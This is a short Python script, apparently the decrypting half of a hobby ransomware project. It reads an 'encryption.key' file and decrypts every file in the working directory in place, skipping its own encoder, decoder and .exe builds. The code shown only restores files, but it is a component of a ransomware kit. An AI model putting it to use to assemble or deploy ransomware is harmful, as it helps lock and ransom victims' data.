import os
from cryptography.fernet import Fernet

files=[]


'''
if you want to add custom path or list directories other than your working directory
import os
from cryptography import fernet

files=[]

for file in os.listdir():
    if file== "ransomewareEncoding.py":
        continue
    if os.path.isdir(file):
        continue
    files.append(file)
print(files)'''

for file in os.listdir():
    if file== "ransomewareEncoding.py" or file=="encryption.key" or file==".git" or file=="ransomewareDecrypting.py" or file=="ransomewareDecrypting.exe" or file=="ransomewareEncoding.exe":
        continue
    if os.path.isdir(file):
        continue
    files.append(file)
print(files)

with open("encryption.key","rb") as key:
    secretkey=key.read()


for file in files:
    with open (file, "rb") as thefile:
        contents=thefile.read()
    contents_decrypted=Fernet(secretkey).decrypt(contents)
    with open (file, "wb") as thefile:
        thefile.write(contents_decrypted)